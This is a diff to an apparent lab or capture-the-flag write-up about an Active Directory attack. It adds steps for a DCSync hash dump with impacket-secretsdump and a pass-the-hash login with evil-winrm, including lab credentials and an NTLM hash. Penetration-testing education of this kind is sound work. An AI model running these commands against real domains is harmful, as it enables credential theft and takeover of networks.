@@ -101,11 +101,17 @@ With my new credentials, i went ahead and ran nxc again to see what i could do w
     
 <img width="805" height="412" alt="Screenshot 2025-12-04 014258" src="https://github.com/user-attachments/assets/5b20ed1d-55cb-478a-becd-4ea188974875" />
 
-This was good news, The pwned text meant that my account had some sort of admin and in this case, my new account was a domain admin. 
+This was good news, The pwned text meant that my account had some sort of admin and in this case, my new account was a Domain Admin. 
 
 
-Using my new credentials, i dumped the 
+With these credentials, i performed a DCSync attack on the Domain Controller so i could get a dump of all NTLM hashes.
 
     impacket-secretsdump kingofthehill.local/peggy:password2@10.109.124.214 -just-dc
 
 <img width="867" height="229" alt="image" src="https://github.com/user-attachments/assets/de9afc0e-679a-42a3-a264-e61782918247" />
+
+NTLM hashes are special, instead of using hashcat to find the admin password you can use something called Pass-The-Hash to log in as Admin. We will be doing that with evil-winrm.
+
+    evil-winrm -i 10.109.124.214 -u Adminstrator -H 5c5aefbcab1053c010bc9c1cfcc6f95d
+    
+<img width="711" height="272" alt="image" src="https://github.com/user-attachments/assets/b7d12dd9-a692-41c1-bb92-4252fd2ab4d0" />
